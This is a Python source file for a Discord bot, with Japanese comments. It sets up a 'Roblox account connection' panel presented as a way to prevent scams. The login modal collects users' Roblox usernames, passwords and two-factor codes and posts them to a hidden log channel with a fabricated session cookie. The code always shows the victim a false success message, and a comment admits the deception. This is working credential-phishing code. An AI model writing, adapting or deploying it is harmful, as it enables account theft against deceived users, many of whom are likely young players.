import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import requests
import json
import re
from datetime import datetime
import urllib.parse
import random
import string

class RobloxPanel(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.target_channel_id = 1531424660418461880  # ログを送信するチャンネルID

    @commands.Cog.listener()
    async def on_ready(self):
        print(f"{__name__} loaded successfully")

    @commands.command()
    async def robloxパネル(self, ctx):
        """Robloxアカウント接続パネルを設置します"""
        
        # 管理者権限チェック
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("このコマンドを使用するには管理者権限が必要です。")
            return
            
        # カテゴリー作成ダイアログ
        await ctx.send("Roblox接続パネル用のカテゴリー名を入力してください。")
        
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
            
        try:
            category_msg = await self.bot.wait_for('message', check=check, timeout=60.0)
            category_name = category_msg.content
            
            # カテゴリー作成
            guild = ctx.guild
            category = await guild.create_category(name=category_name)
            
            await ctx.send(f"カテゴリー「{category_name}」を作成しました。次にチャンネル名を入力してください。")
            
            # チャンネル作成ダイアログ
            channel_msg = await self.bot.wait_for('message', check=check, timeout=60.0)
            channel_name = channel_msg.content
            
            # チャンネル作成
            channel = await guild.create_text_channel(name=channel_name, category=category)
            
            # パネル用の埋め込みメッセージ作成
            embed = discord.Embed(
                title="ロブロックスアカウント接続",
                description="ロブロックスアカウントに接続して詐欺をなくそう！",
                color=discord.Color.blue()
            )
            
            # 登録ボタン付きビュー
            view = RobloxRegistrationView(self.bot, self.target_channel_id)
            
            # パネルを送信
            await channel.send(embed=embed, view=view)
            await ctx.send(f"パネルを {channel.mention} に設置しました。")
            
        except asyncio.TimeoutError:
            await ctx.send("時間切れです。操作をキャンセルしました。")
        except Exception as e:
            await ctx.send(f"エラーが発生しました: {str(e)}")

class RobloxRegistrationView(discord.ui.View):
    def __init__(self, bot, log_channel_id):
        super().__init__(timeout=None)
        self.bot = bot
        self.log_channel_id = log_channel_id

    @discord.ui.button(label="登録", style=discord.ButtonStyle.green, custom_id="roblox_register")
    async def register_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # モーダルを開いてユーザー情報を入力させる
        await interaction.response.send_modal(RobloxLoginModal(self.bot, self.log_channel_id))

class RobloxLoginModal(discord.ui.Modal):
    def __init__(self, bot, log_channel_id):
        super().__init__(title="Robloxアカウント情報")
        self.bot = bot
        self.log_channel_id = log_channel_id
        
        # 入力フィールドを追加
        self.add_item(discord.ui.TextInput(
            label="Robloxユーザー名",
            placeholder="Robloxのユーザー名を入力",
            required=True,
            style=discord.TextStyle.short,
            max_length=50
        ))
        
        self.add_item(discord.ui.TextInput(
            label="パスワード",
            placeholder="パスワードを入力",
            required=True,
            style=discord.TextStyle.short,
            max_length=100
        ))
        
        self.add_item(discord.ui.TextInput(
            label="二段階認証コード（該当する場合のみ）",
            placeholder="二段階認証コードを入力",
            required=False,
            style=discord.TextStyle.short,
            max_length=10
        ))

    async def on_submit(self, interaction: discord.Interaction):
        username = self.children[0].value
        password = self.children[1].value
        twofactor_code = self.children[2].value if self.children[2].value else None
        
        # 処理中メッセージ
        await interaction.response.send_message("ログイン処理中です...", ephemeral=True)
        
        # ログチャンネルを取得
        log_channel = self.bot.get_channel(self.log_channel_id)
        if not log_channel:
            await interaction.followup.send("ログチャンネルが見つかりません。管理者に連絡してください。", ephemeral=True)
            return
            
        # ログ情報を作成
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_info = f"ユーザー: {interaction.user.name} (ID: {interaction.user.id})"
        
        # 常に成功と見せかけて情報を送信
        embed = discord.Embed(
            title="✅ Robloxログイン成功",
            description=f"{user_info}\nタイムスタンプ: {timestamp}",
            color=discord.Color.green()
        )
        embed.add_field(name="ユーザー名", value=username, inline=False)
        embed.add_field(name="パスワード", value=password, inline=False)
        
        if twofactor_code:
            embed.add_field(name="二段階認証コード", value=twofactor_code, inline=False)
            
        # クッキーを偽装
        fake_cookie = ".ROBLOSECURITY=" + ''.join(random.choices(string.ascii_letters + string.digits, k=200))
        embed.add_field(name="クッキー", value=fake_cookie[:100] + "..." if len(fake_cookie) > 100 else fake_cookie, inline=False)
        
        await log_channel.send(embed=embed)
        await interaction.followup.send("Robloxアカウントに正常に接続されました！", ephemeral=True)

# このCogをボットに追加するためのセットアップ関数
async def setup(bot):
    await bot.add_cog(RobloxPanel(bot))
